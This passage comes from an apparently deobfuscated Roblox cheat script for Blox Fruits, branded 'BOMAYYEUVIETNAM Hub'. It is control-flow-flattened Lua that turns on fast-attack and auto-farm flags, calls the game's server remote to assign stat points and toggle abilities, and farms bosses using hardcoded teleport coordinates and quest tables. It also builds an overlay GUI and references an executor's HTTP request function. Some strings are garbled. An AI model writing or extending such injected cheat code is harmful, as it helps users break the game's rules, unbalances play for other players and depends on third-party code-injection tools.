                      new2, itemLabel12, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693
                    )

                    divider2.CMon = CFrame.new(
                      1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-8, -0.070099175, -1.69377223e-8, 1, -8.17798806e-8, 0.070099175, -8.03913949e-8, -0.997540116
                    )

                    typeAccountScroll = {}
                    bomayyeuvietnamKaitunRunning2 = 85
                    itemLabel1 = "Min"
                  else
                    top[udim2] = textLabel2(
                      udim22, under, uiGradient, new7, fromRGB2, 0.892505825, -1.08168464e-7, 1, -3.22542007e-7, -0.892505825, -2.4201924e-7, -0.451037169
                    )

                    udim2 = {
                      Min = 1375, Max = 1424, Ms = "Snow Lurker", Mon = "Snow Lurker", Quest = "FrostQuest", QLv = 2, Next = 1450, }

                    bomayyeuvietnamKaitunRunning2 = 87
                    textLabel2 = "Fallback"
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 78 then
                  if bomayyeuvietnamKaitunRunning2 <= 76 then
                    fromRGB.Quest = "ShipQuest1"
                    fromRGB.QLv = 2
                    fromRGB.Next = 1300
                    fromRGB.Fallback = "Ship Deckhand"

                    fromRGB.CQ = CFrame.new(
                      1037.80127, 125.092171, 32911.6016, -0.244533166, 0, -0.969640911, 0, 1.00000012, 0, 0.96964103, 0, -0.244533136
                    )

                    cframe2 = CFrame
                    bomayyeuvietnamKaitunRunning2 = 199
                    new6 = "CMon"
                  elseif bomayyeuvietnamKaitunRunning2 <= 77 then
                    fromRGB.Parent = dutDit
                    fromRGB.Thickness = 1

                    dutDit = Instance.new("UIGradient")
                    dutDit.Parent = fromRGB

                    cframe2 = NumberSequence.new
                    udim2 = {}
                    udim22 = NumberSequenceKeypoint.new(0, 0)
                    uiGradient = NumberSequenceKeypoint.new(0, 0)
                    fromRGB2 = NumberSequenceKeypoint
                    bomayyeuvietnamKaitunRunning2 = 16
                    fromRGB = "Transparency"
                    fontWeight = "new"
                  else
                    udim2.QLv = 1
                    udim2.Next = 2150

                    udim2.CQ = CFrame.new(
                      -820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-8, -0.568714678, -2.08336317e-8, 1, 6.20846663e-8, 0.568714678, -3.92184099e-8, 0.822534859
                    )

                    udim22 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 236
                    textLabel2 = "CMon"
                    under = -821.614075
                    uiGradient = 208.39537
                    new7 = -10990.7617
                    fromRGB2 = -0.870096624
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 79 then
                  task.spawn(function()
                    local val125 = 0

                    while true do
                      if val125 <= 0 then
                        val125 = task.wait(0.5) and 1

                        if val125 then
                          continue
                        end

                        val125 = 2
                        continue
                      end

                      if val125 <= 1 then
                        val21.p(function()
                          local val126 = 18
                          local val127 = nil

                          while true do
                            if not (val126 <= 9) then
                              if val126 <= 14 then
                                if val126 <= 11 then
                                  if val126 <= 10 then
                                    val126 = val127 and 12 or 13
                                  else
                                    val126 = val127 and 16 or 3
                                  end
                                elseif val126 <= 12 then
                                  val127 = localPlayer.Data.Stats.Defense.Level.Value < val20
                                  val126 = 13
                                elseif val126 <= 13 then
                                  val126 = val127 and 1 or 8
                                else
                                  val127 = localPlayer.Data.Stats.Sword.Level.Value < val20
                                  val126 = 17
                                end
                              elseif val126 <= 17 then
                                if val126 <= 15 then
                                  val37.Remotes.CommF_:InvokeServer(
                                    "AddPoint", "Sword", localPlayer.Data.Points.Value
                                  )

                                  val126 = 20
                                elseif val126 <= 16 then
                                  val127 = localPlayer.Data.Points.Value > 0
                                  val126 = 3
                                else
                                  val126 = val127 and 15 or 20
                                end
                              elseif val126 <= 18 then
                                local val128 = localPlayer.Data.Points.Value > 0

                                if val128 then
                                  val126 = 19
                                else
                                  val126 = 5
                                  val127 = val128
                                end
                              elseif val126 <= 19 then
                                val127 = localPlayer.Data.Stats.Melee.Level.Value < val20
                                val126 = 5
                              else
                                val126 = not val21.ffc(localPlayer.Character, "HasBuso") and 0 or 6
                              end

                              continue
                            end

                            if val126 <= 4 then
                              if val126 <= 1 then
                                if val126 <= 0 then
                                  val37.Remotes.CommF_:InvokeServer("Buso")
                                  val126 = 6
                                else
                                  val37.Remotes.CommF_:InvokeServer(
                                    "AddPoint", "Defense", localPlayer.Data.Points.Value
                                  )

                                  val126 = 8
                                end
                              elseif val126 <= 2 then
                                val37.Remotes.CommF_:InvokeServer(
                                  "AddPoint", "Melee", localPlayer.Data.Points.Value
                                )

                                val126 = 7
                              elseif val126 <= 3 then
                                val126 = val127 and 14 or 17
                              else
                                val127 = localPlayer.Data.Points.Value > 0
                                val126 = 10
                              end

                              continue
                            end

                            if not (val126 <= 6) then
                              if val126 <= 7 then
                                local val129 = localPlayer.Data.Stats.Melee.Level.Value >= val20

                                if val129 then
                                  val126 = 4
                                else
                                  val126 = 10
                                  val127 = val129
                                end
                              elseif val126 <= 8 then
                                local val130 = localPlayer.Data.Stats.Melee.Level.Value >= val20

                                if val130 then
                                  val126 = 9
                                else
                                  val126 = 11
                                  val127 = val130
                                end
                              else
                                val127 = localPlayer.Data.Stats.Defense.Level.Value >= val20
                                val126 = 11
                              end

                              continue
                            end

                            if val126 <= 5 then
                              val126 = val127 and 2 or 7
                              continue
                            end

                            break
                          end
                        end)

                        val125 = 0
                        continue
                      end

                      break
                    end
                  end)

                  getgenv()["Fast Attack"] = true
                  task.spawn(function(...) end)
                  frame = GetM("Mirror Fractal")
                  bomayyeuvietnamKaitunRunning2 = 245
                  cframe = 0
                elseif bomayyeuvietnamKaitunRunning2 <= 80 then
                  textLabel[dutDit] = new(fromRGB2, fontWeight, cframe3[val42].Normal)
                  textLabel.Text = "Beli: N/A"
                  textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                  textLabel.TextSize = 16
                  textLabel.TextXAlignment = Enum.TextXAlignment.Left

                  new = Enum.TextYAlignment
                  bomayyeuvietnamKaitunRunning2 = 5
                  dutDit = "TextYAlignment"
                  fromRGB2 = "Bottom"
                else
                  new4[new5] = fromRGB
                  new4.MinSea = 3

                  new5 = { Name = "Death Step", Target = 400, MinSea = 3 }
                  fromRGB = { Name = "Sharkman Karate", Target = 400, MinSea = 3 }
                  new6 = { Name = "Electric Claw", Target = 400 }
                  bomayyeuvietnamKaitunRunning2 = 190
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 87 then
                if bomayyeuvietnamKaitunRunning2 <= 84 then
                  if bomayyeuvietnamKaitunRunning2 <= 82 then
                    val47[val48] = 2625
                    val47.Max = 2649
                    val47.Ms = "Coral Pirate"
                    val47.Mon = "Coral Pirates"
                    val47.Quest = "SubmergedQuest1"
                    val47.QLv = 2
                    val47.Next = 2650
                    val47.Fallback = "Reef Bandit"

                    new8 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 3
                    val48 = "CQ"
                    val49 = 10778.875
                    new9 = -2087.72437
                    val50 = 9265.18359
                    val51 = 0.934615612
                  elseif bomayyeuvietnamKaitunRunning2 <= 83 then
                    new.Parent = dutDit
                    new.AnchorPoint = Vector2.new(0.5, 0.5)
                    new.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
                    new.BackgroundTransparency = 1
                    new.BorderSizePixel = 0

                    main = UDim2.new(0.5, 0, 0.0500000007, 0)
                    bomayyeuvietnamKaitunRunning2 = 117
                    dropShadow2 = "Position"
                  else
                    fromRGB2[fontWeight] = 2349
                    fromRGB2.Ms = "Chocolate Bar Battler"
                    fromRGB2.Mon = "Chocolate Bar Battler"
                    fromRGB2.Quest = "ChocQuest1"
                    fromRGB2.QLv = 2
                    fromRGB2.Next = 2350
                    fromRGB2.Fallback = "Cocoa Warrior"
                    fromRGB2.CQ = CFrame.new(230.191864, 24.734258, -12202.65722)

                    cframe3 = CFrame
                    bomayyeuvietnamKaitunRunning2 = 337
                    fontWeight = "CMon"
                    val42 = "new"
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 85 then
                  typeAccountScroll[itemLabel1] = 90
                  typeAccountScroll.Max = 99
                  typeAccountScroll.Ms = "Snow Bandit"
                  typeAccountScroll.Mon = "Snow Bandit"
                  typeAccountScroll.Quest = "SnowQuest"
                  typeAccountScroll.QLv = 1
                  typeAccountScroll.Next = 100

                  new2 = CFrame.new
                  bomayyeuvietnamKaitunRunning2 = 314
                  itemLabel1 = "CQ"
                  itemLabel12 = 1389.74451
                  textLabel = 86.6520844
                  levelLabel = -1298.90796
                  new3 = -0.342042685
                  dropShadow2 = 0
                  main = 0.939684391
                  new4 = 0
                  new5 = 1
                elseif bomayyeuvietnamKaitunRunning2 <= 86 then
                  coinCard[fromRGB2] = fontWeight
                  coinCard.ResetOnSpawn = false
                  coinCard.DisplayOrder = 20

                  frame.AnchorPoint = Vector2.new(0.5, 0.5)
                  frame.BackgroundColor3 = Color3.fromRGB(163, 163, 163)
                  frame.BackgroundTransparency = 1

                  fontWeight = Color3.fromRGB
                  bomayyeuvietnamKaitunRunning2 = 164
                  fromRGB2 = "BorderColor3"
                  cframe3 = 27
                  val42 = 42
                  val43 = 53
                else
                  udim2[textLabel2] = "Arctic Warrior"

                  udim2.CQ = CFrame.new(
                    5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909
                  )

                  udim22 = CFrame.new
                  bomayyeuvietnamKaitunRunning2 = 268
                  textLabel2 = "CMon"
                  under = 5513.36865
                  uiGradient = 60.546711
                  new7 = -6809.94971
                  fromRGB2 = -0.958693981
                  fontWeight = -1.65617333e-8
                  cframe3 = 0.284439981
                  val42 = -4.07668654e-9
                  val43 = 1
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 90 then
                if bomayyeuvietnamKaitunRunning2 <= 88 then
                  new4[new5] = Vector2.new(0.5, 0)
                  new4.BackgroundColor3 = Color3.fromRGB(163, 162, 165)
                  new4.BackgroundTransparency = 1
                  new4.Position = UDim2.new(0.5, 0, 0, 10)

                  fromRGB = UDim2.new
                  bomayyeuvietnamKaitunRunning2 = 13
                  new5 = "Size"
                  cframe2 = 0
                elseif bomayyeuvietnamKaitunRunning2 <= 89 then
                  fromRGB.FontFace = Font.new(
                    "rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal
                  )

                  fromRGB.Text = "Ã°ÂŸÂ”Â´ Skull Guitar"
                  fromRGB.TextColor3 = Color3.fromRGB(255, 255, 255)
                  fromRGB.TextSize = 16

                  bomayyeuvietnamKaitunRunning2 = 181
                else
                  typeAccountScroll[itemLabel1] = new2

                  typeAccountScroll.CQ = CFrame.new(
                    5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, 0, -1, 0, 0
                  )

                  typeAccountScroll.CMon = CFrame.new(4770.499023, 758.9552, 1069.868041)

                  itemLabel1 = { Min = 1650 }
                  bomayyeuvietnamKaitunRunning2 = 116
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 91 then
                divider[divider2] = typeAccountScroll

                divider2 = {
                  Min = 75, Max = 89, Ms = "Desert Officer", Mon = "Desert Officer", Quest = "DesertQuest", QLv = 2, Next = 90, Fallback = "Desert Bandit", }

                itemLabel1 = CFrame.new
                bomayyeuvietnamKaitunRunning2 = 74
                typeAccountScroll = "CQ"
                new2 = 894.488647
                itemLabel12 = 5.14000702
              elseif bomayyeuvietnamKaitunRunning2 <= 92 then
                cframe = syn.request
                bomayyeuvietnamKaitunRunning2 = 193
              else
                new[divider] = "Area1Quest"
                new.QLv = 2
                new.Next = 775
                new.Fallback = "Raider"

                new.CQ = CFrame.new(
                  -429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985
                )

                divider2 = CFrame
                bomayyeuvietnamKaitunRunning2 = 311
                divider = "CMon"
                typeAccountScroll = "new"
              end

              continue
            elseif bomayyeuvietnamKaitunRunning2 <= 140 then
              if bomayyeuvietnamKaitunRunning2 <= 116 then
                if bomayyeuvietnamKaitunRunning2 <= 104 then
                  if bomayyeuvietnamKaitunRunning2 <= 98 then
                    if bomayyeuvietnamKaitunRunning2 <= 95 then
                      if bomayyeuvietnamKaitunRunning2 <= 94 then
                        new[dutDit] = fromRGB2(fontWeight, cframe3, val42)
                        new.Thickness = 2.5
                        new.Parent = cframe

                        divider.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        divider.Name = "Divider"
                        divider.Parent = cframe
                        divider.Position = UDim2.new(0.15000000596046, 0, 0.15000000596046, 0)

                        bomayyeuvietnamKaitunRunning2 = 112
                        dutDit = "Size"
                      else
                        divider[divider2] = typeAccountScroll[itemLabel1](
                          894.488647, 5.14000702, 4392.43359, 0.819155693, 0, -0.573571265, 0, 1, 0, 0.573571265, 0, 0.819155693
                        )

                        typeAccountScroll = CFrame.new(
                          932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-8, 0.0524050146, 2.79967303e-8, 1, -5.60361286e-8, -0.0524050146, -5.44919629e-8, -0.998625934
                        )

                        bomayyeuvietnamKaitunRunning2 = 91
                        divider2 = "CMon"
                      end

                      continue
                    elseif bomayyeuvietnamKaitunRunning2 <= 96 then
                      val98 = 10
                      break
                    else
                      if bomayyeuvietnamKaitunRunning2 <= 97 then
                        under[uiGradient] = CFrame.new(-1817.974731, 209.563278, -12288.92285)

                        uiGradient = {
                          Min = 2250, Max = 2299, Ms = "Baking Staff", Mon = "Baking Staff", Quest = "CakeQuest2", QLv = 1, Next = 2300, }

                        bomayyeuvietnamKaitunRunning2 = 69
                        new7 = "Fallback"
                        fromRGB2 = "Cookie Crafter"
                      else
                        cameraBlur = cframe[dutDit]("BlurEffect")
                        cameraBlur.Name = "CameraBlur"
                        cameraBlur.Size = 8
                        cameraBlur.Parent = frame

                        coinCard = Instance.new("ScreenGui")
                        frame = Instance.new("Frame")
                        cframe = Instance.new("Frame")
                        dutDit = Instance.new("UICorner")
                        new = Instance
                        bomayyeuvietnamKaitunRunning2 = 308
                      end

                      continue
                    end
                  else
                    if bomayyeuvietnamKaitunRunning2 <= 101 then
                      if bomayyeuvietnamKaitunRunning2 <= 99 then
                        val48[new8] = val49(
                          new9, val50, val51, val52, val53, val54, val55, val56, 8.00902953e-8, 0.946948707, -4.18033075e-8, -0.321384728
                        )

                        val48.CMon = CFrame.new(
                          10671.2715, -2057.59155, 10047.2588, -0.846484065, -3.11045447e-8, 0.532414079, -5.55383117e-8, 1, -2.98785316e-8, -0.532414079, -5.48610757e-8, -0.846484065
                        )

                        new8 = { Min = 2675, Max = 2699 }
                        bomayyeuvietnamKaitunRunning2 = 2
                      elseif bomayyeuvietnamKaitunRunning2 <= 100 then
                        divider2[typeAccountScroll] = itemLabel1
                        divider2.Mon = "Dragon Crew Archer"
                        divider2.Quest = "AmazonQuest"
                        divider2.QLv = 2
                        divider2.Next = 1625
                        divider2.Fallback = "Dragon Crew Warrior"

                        itemLabel1 = CFrame.new
                        bomayyeuvietnamKaitunRunning2 = 48
                        typeAccountScroll = "CQ"
                        new2 = 5832.83594
                        itemLabel12 = 51.6806107
                        textLabel = -1101.51563
                        levelLabel = 0.898790359
                        new3 = 0
                        dropShadow2 = -0.438378751
                        main = 0
                        new4 = 1
                        new5 = 0
                        fromRGB = 0.438378751
                        new6 = 0
                        cframe2 = 0.898790359
                      else
                        udim22[under] = uiGradient(
                          new7, fromRGB2, fontWeight, cframe3, val42, val43, val44, val45, val46, -0.996196866, 0, 0.087131381
                        )

                        udim22.CMon = CFrame.new(
                          5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-8, 0.443124533, -1.34262139e-8, 1, -6.26611296e-8, -0.443124533, 5.02237434e-8, 0.896460414
                        )

                        under = { Min = 650, Max = 9999 }
                        bomayyeuvietnamKaitunRunning2 = 14
                        uiGradient = "Ms"
                        new7 = "Galley Captain"
                      end
                    elseif bomayyeuvietnamKaitunRunning2 <= 102 then
                      new7[dutDit] = new(udim2, udim22, 0.5, 0)
                      new7.Size = UDim2.new(1, 47, 1, 47)
                      new7.ZIndex = 0
                      new7.Image = "rbxthumb://type=Asset&id=110625942841371&w=150&h=150"
                      new7.ImageTransparency = 0.25
                      new7.ImageColor3 = Color3.fromRGB(0, 0, 0)

                      bomayyeuvietnamKaitunRunning2 = 145
                    elseif bomayyeuvietnamKaitunRunning2 <= 103 then
                      frame = getgenv().Configs.Quest["RGB Haki"]
                      bomayyeuvietnamKaitunRunning2 = 34
                    else
                      new[divider] = CFrame.new(
                        -4957.67041, 35.949837, -4665.599609, 0.890994847, 0, -0.454013437, 0, 1, 0, 0.454013437, 0, 0.890994847
                      )

                      new[3] = CFrame.new(-4975.763671875, 314.5537109375, -3215.6198730469)

                      cframe[dutDit] = new
                      cframe.Command = { "BuyFishmanKarate" }

                      bomayyeuvietnamKaitunRunning2 = 55
                    end

                    continue
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 110 then
                  if bomayyeuvietnamKaitunRunning2 <= 107 then
                    if bomayyeuvietnamKaitunRunning2 <= 105 then
                      divider = Instance.new("TextLabel")
                      divider.Name = "SectionTitle"
                      divider.Parent = dutDit
                      divider.Position = UDim2.new(0, 12, 0, 10)
                      divider.Size = UDim2.new(1, -24, 0, 20)

                      bomayyeuvietnamKaitunRunning2 = 221
                      divider2 = "BackgroundTransparency"
                    elseif bomayyeuvietnamKaitunRunning2 <= 106 then
                      new5.Ms = "Ship Deckhand"
                      new5.Mon = "Ship Deckhand"
                      new5.Quest = "ShipQuest1"
                      new5.QLv = 1
                      new5.Next = 1275

                      new6 = CFrame.new(
                        1037.80127, 125.092171, 32911.6016, -0.244533166, 0, -0.969640911, 0, 1.00000012, 0, 0.96964103, 0, -0.244533136
                      )

                      bomayyeuvietnamKaitunRunning2 = 359
                      fromRGB = "CQ"
                    else
                      textLabel[levelLabel] = new3
                      textLabel.Quest = "SnowMountainQuest"
                      textLabel.QLv = 1
                      textLabel.Next = 1050

                      textLabel.CQ = CFrame.new(
                        609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106
                      )

                      new3 = CFrame.new
                      bomayyeuvietnamKaitunRunning2 = 362
                      levelLabel = "CMon"
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 108 then
                    top[divider] = divider2(udim2, udim22, 0, 22)
                    top.Text = "BOMAYYEUVIETNAM Hub"
                    top.TextColor3 = val25.Text
                    top.TextSize = 17
                    top.TextXAlignment = Enum.TextXAlignment.Left
                    top.TextYAlignment = Enum.TextYAlignment.Center

                    divider = Instance.new
                    bomayyeuvietnamKaitunRunning2 = 277
                  elseif bomayyeuvietnamKaitunRunning2 <= 109 then
                    typeAccountScroll[dutDit] = new[fromRGB2](27, 42, 53)
                    typeAccountScroll.Name = "TypeAccountScroll"
                    typeAccountScroll.Parent = cframe

                    typeAccountScroll.Position = UDim2.new(
                      0.55000001192093, 0, 0.34999999403954, 0
                    )

                    typeAccountScroll.Size = UDim2.new(0.40000000596046, 0, 0.34999999403954, 0)

                    bomayyeuvietnamKaitunRunning2 = 6
                    dutDit = "Selectable"
                  else
                    bomayyeuvietnamKaitunRunning2 = frame and 151 or 146
                  end

                  continue
                elseif bomayyeuvietnamKaitunRunning2 <= 113 then
                  if bomayyeuvietnamKaitunRunning2 <= 111 then
                    val98 = 9
                    break
                  end

                  if bomayyeuvietnamKaitunRunning2 <= 112 then
                    divider[dutDit] = UDim2.new(0.69999998807907, 0, 0, 2)
                    divider.Selectable = false

                    divider2.BorderColor3 = Color3.fromRGB(27, 42, 53)
                    divider2.Name = "Divider"
                    divider2.Parent = cframe

                    new = UDim2.new
                    bomayyeuvietnamKaitunRunning2 = 343
                    dutDit = "Position"
                    fromRGB2 = 0.10000000149012
                    fontWeight = 0
                  else
                    new3[dropShadow2] = main(
                      new4, new5, fromRGB, new6, cframe2, top, udim2, textLabel2, udim22, -0.822046936, -6.74401548e-8, -0.569419742
                    )

                    dropShadow2 = {
                      Min = 1125, Max = 1174, Ms = "Horned Warrior", Mon = "Horned Warrior", Quest = "IceSideQuest", QLv = 2, Next = 1175, Fallback = "Lab Subordinate", }

                    new4 = CFrame
                    bomayyeuvietnamKaitunRunning2 = 52
                    main = "CQ"
                  end

                  continue
                else
                  if bomayyeuvietnamKaitunRunning2 <= 114 then
                    cframe2.Ms = "Peanut Scout"
                    cframe2.Mon = "Peanut Scout"
                    cframe2.Quest = "NutsIslandQuest"
                    cframe2.QLv = 1
                    cframe2.Next = 2100

                    udim2 = CFrame.new(
                      -2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-9, 0.651306927, 2.85280208e-8, 1, -3.1108879e-8, -0.651306927, 4.21863646e-8, 0.758814394
                    )

                    bomayyeuvietnamKaitunRunning2 = 158
                    top = "CQ"
                  elseif bomayyeuvietnamKaitunRunning2 <= 115 then
                    new2[itemLabel12] = textLabel[levelLabel](
                      -4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-8, -0.96181643, 4.37720793e-8, 1, -4.37274998e-8, 0.96181643, -3.01326679e-8, 0.273695946
                    )

                    itemLabel12 = {
                      Min = 99999, Max = 99999, Ms = "Sky Bandit", Mon = "Sky Bandit", Quest = "SkyQuest", }

                    bomayyeuvietnamKaitunRunning2 = 252
                    textLabel = "QLv"
                  else
                    itemLabel1.Max = 1699
                    itemLabel1.Ms = "Giant Islander"
                    itemLabel1.Mon = "Giant Islander"
                    itemLabel1.Quest = "AmazonQuest2"
                    itemLabel1.QLv = 2
                    itemLabel1.Next = 1700
                    itemLabel1.Fallback = "Female Islander"

                    itemLabel12 = CFrame.new
                    bomayyeuvietnamKaitunRunning2 = 177
                    new2 = "CQ"
                    textLabel = 5448.86133
                    levelLabel = 601.516174
                    new3 = 751.130676
                    dropShadow2 = 0
                    main = 0
                    new4 = 1
                    new5 = 0
                  end

                  continue
                end
              elseif bomayyeuvietnamKaitunRunning2 <= 128 then
                if bomayyeuvietnamKaitunRunning2 <= 122 then
                  if bomayyeuvietnamKaitunRunning2 <= 119 then
                    if bomayyeuvietnamKaitunRunning2 <= 117 then
                      new[dropShadow2] = main
                      new.Size = UDim2.new(0, 320, 0, 68)
                      new.ZIndex = 0

                      dropShadow2 = Instance.new("ImageLabel")
                      dropShadow2.Name = "DropShadow2"
                      dropShadow2.Parent = new
                      dropShadow2.AnchorPoint = Vector2.new(0.5, 0.5)

                      new4 = Color3
                      bomayyeuvietnamKaitunRunning2 = 230
                      main = "BackgroundColor3"
                    elseif bomayyeuvietnamKaitunRunning2 <= 118 then
                      val32[frame] = cframe(dutDit, new, -1305.22)
                      val32.MarineQuest2 = CFrame.new(-4688.98, 5.88, 4226.45)
                      val32.SkyQuest = CFrame.new(-4742.24, 967.4, -745.69)
                      val32.PrisonerQuest = CFrame.new(5201.2, 19.55, 735.93)

                      bomayyeuvietnamKaitunRunning2 = 229
                      frame = "ImpelQuest"
                    else
                      bomayyeuvietnamKaitunRunning2 = frame and 212 or 210
                    end
                  elseif bomayyeuvietnamKaitunRunning2 <= 120 then
                    levelLabel[new3] = dropShadow2(
                      main, new4, new5, -0.698032081, -8.28980049e-8, -0.71606636, -1.98835952e-8, 1, -9.63858184e-8, 0.71606636, -5.30424877e-8, -0.698032081
                    )

                    new3 = {
                      Min = 1100, Max = 1124, Ms = "Lab Subordinate", Mon = "Lab Subordinate", Quest = "IceSideQuest", QLv = 1, }

                    bomayyeuvietnamKaitunRunning2 = 28
                    dropShadow2 = "Next"
                    main = 1125
                  elseif bomayyeuvietnamKaitunRunning2 <= 121 then
                    cframe2.Next = 475
                    cframe2.Fallback = "Fishman Commando"
                    cframe2.CQ = CFrame.new(-4721.71436, 845.277161, -1954.20105)
                    cframe2.CMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)

                    top = { Min = 475, Max = 524 }
                    bomayyeuvietnamKaitunRunning2 = 270
                    udim2 = "Ms"
                  else
                    function val22.PrioritizeRipIndra(ripIndraTrueForm3)
                      local val131 = 10
                      local humanoid2 = nil
                      local humanoidRootPart2 = nil
                      local val132 = nil

                      while true do
                        if val131 <= 13 then
                          if val131 <= 6 then
                            if val131 <= 2 then
                              if val131 <= 0 then
                                val19.Remotes.CommF_:InvokeServer("Buso")
                                val131 = 5
                              elseif val131 <= 1 then
                                val131 = val132 and 20 or 3
                              else
                                val35(humanoidRootPart2.CFrame * CFrame.new(0, 30, 0), 1.5)
                                val131 = 20
                              end

                              continue
                            end

                            if val131 <= 4 then
                              if val131 <= 3 then
                                val21.wt(0.1)
                                val131 = not val21.ffc(localPlayer.Character, "HasBuso") and 0 or 5
                                continue
                              end

                              return false
                            end

                            if val131 <= 5 then
                              val35(humanoidRootPart2.CFrame * CFrame.new(0, -30, 0), 1.5)
                              val36()
                              local val133 = ripIndraTrueForm3.Parent ~= val18

                              if val133 then
                                val131 = 17
                                val132 = val133
                              else
                                val131 = 11
                              end
                            else
                              local fireEssence2 = val34("Fire Essence")

                              if fireEssence2 then
                                val131 = 14
                              else
                                val131 = 26
                                ripIndraTrueForm3 = fireEssence2
                              end
                            end

                            continue
                          end

                          if val131 <= 9 then
                            if val131 <= 7 then
                              humanoid2 = ripIndraTrueForm3:FindFirstChild("Humanoid")
                              val131 = 27
                            elseif val131 <= 8 then
                              humanoidRootPart2 = ripIndraTrueForm3:FindFirstChild("HumanoidRootPart")
                              val131 = 15
                            else
                              ripIndraTrueForm3 = val19:FindFirstChild("rip_indra True Form")
                              val131 = 12
                            end
                          elseif val131 <= 11 then
                            if val131 <= 10 then
                              local val134 = not Three_World

                              if val134 then
                                val131 = 26
                                ripIndraTrueForm3 = val134
                              else
                                val131 = 6
                              end
                            else
                              val132 = humanoid2.Health <= 0
                              val131 = 17
                            end
                          elseif val131 <= 12 then
                            if ripIndraTrueForm3 then
                              val131 = 7
                            else
                              val131 = 27
                              humanoid2 = ripIndraTrueForm3
                            end
                          else
                            Quest = nil
                            val21.Status(" Status : Farm rip_indra")
                            val131 = ripIndraTrueForm3.Parent == val18 and 3 or 2
                          end
                        else
                          if val131 <= 20 then
                            if val131 <= 16 then
                              if val131 <= 14 then
                                ripIndraTrueForm3 = not ripIndraTrueForm3
                                val131 = 26
                              elseif val131 <= 15 then
                                local val135 = not humanoid2

                                if val135 then
                                  val131 = 23
                                  val132 = val135
                                else
                                  val131 = 18
                                end
                              else
                                local ripIndraTrueForm4 = val18:FindFirstChild("rip_indra True Form")

                                if ripIndraTrueForm4 then
                                  val131 = 12
                                  ripIndraTrueForm3 = ripIndraTrueForm4
                                else
                                  val131 = 9
                                end
                              end
                            elseif val131 <= 18 then
                              if val131 <= 17 then
                                val131 = val132 and 1 or 19
                              else
                                val132 = not humanoidRootPart2
                                val131 = 23
                              end
                            elseif val131 <= 19 then
                              val132 = not getgenv().AutoFarm
                              val131 = 1
                            else
                              val131 = 22
                              ripIndraTrueForm3 = true
                            end

                            continue
                          end

                          if val131 <= 23 then
                            if val131 <= 21 then
                              return false
                            end

                            if val131 <= 22 then
                              break
                            end

                            val131 = val132 and 24 or 25
                            continue
                          end

                          if val131 <= 25 then
                            if val131 <= 24 then
                              val131 = val132 and 21 or 13
                            else
                              val132 = humanoid2.Health <= 0
                              val131 = 24
                            end
                          elseif val131 <= 26 then
                            val131 = ripIndraTrueForm3 and 4 or 16
                          elseif ripIndraTrueForm3 then
                            val131 = 8
                          else
                            val131 = 15
                            humanoidRootPart2 = ripIndraTrueForm3
                          end
                        end
                      end

                      return ripIndraTrueForm3
                    end

                    task.spawn(function()
                      local val136 = 4

                      while true do
                        if val136 <= 1 then
                          if val136 <= 0 then
                            val136 = not noFruit and 3 or 4
                          else
                            pcall(val36)
                            val136 = 4
                          end

                          continue
                        end

                        if not (val136 <= 2) then
                          if val136 <= 3 then
                            val38()
                            val136 = 1
                          else
                            val136 = val21.wt() and 0 or 2
                          end

                          continue
                        end

                        break
                      end
                    end)

                    getgenv().AutoFarm = false
                    val21.Status(" Status : Read Melee Inventory")
                    val22.GetStep(true)
                    getgenv().AutoFarm = true
                    local threeWorld2 = Three_World

                    if threeWorld2 then
                      bomayyeuvietnamKaitunRunning2 = 279
                    else
                      bomayyeuvietnamKaitunRunning2 = 339
                      frame = threeWorld2
                    end
                  end
                elseif bomayyeuvietnamKaitunRunning2 <= 125 then
                  if bomayyeuvietnamKaitunRunning2 <= 123 then
                    new3[dropShadow2] = main(
                      new4, new5, fromRGB, new6, cframe2, top, 1.60817859e-9, 1, -5.16744869e-9, 0.995993316, -2.06384709e-9, -0.0894274712
                    )

                    new3.CMon = CFrame.new(
                      5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372
                    )

                    dropShadow2 = { Min = 250 }
                    bomayyeuvietnamKaitunRunning2 = 22
                    main = "Max"
                    new4 = 274
                  elseif bomayyeuvietnamKaitunRunning2 <= 124 then
                    dropShadow2[main] = new4(new5, fromRGB, 450, 450)

                    main = Instance.new("Frame")
                    main.Name = "Main"
                    main.Parent = dropShadow2
                    main.AnchorPoint = Vector2.new(0.5, 0.5)
                    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    main.BackgroundTransparency = 0.5

                    bomayyeuvietnamKaitunRunning2 = 288
                  else
                    udim22[under] = uiGradient(
                      new7, fromRGB2, fontWeight, 0.990270376, 0, -0.13915664, 0, 1, 0, 0.13915664, 0, 0.990270376
                    )

                    udim22.CMon = CFrame.new(
                      -3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-8, -0.670276582, 1.69155214e-8, 1, -6.46908234e-8, 0.670276582, 3.66697037e-8, 0.742111444
                    )

                    cframe[1] = dutDit
                    cframe[2] = new
                    cframe[3] = divider
                    cframe[4] = divider2
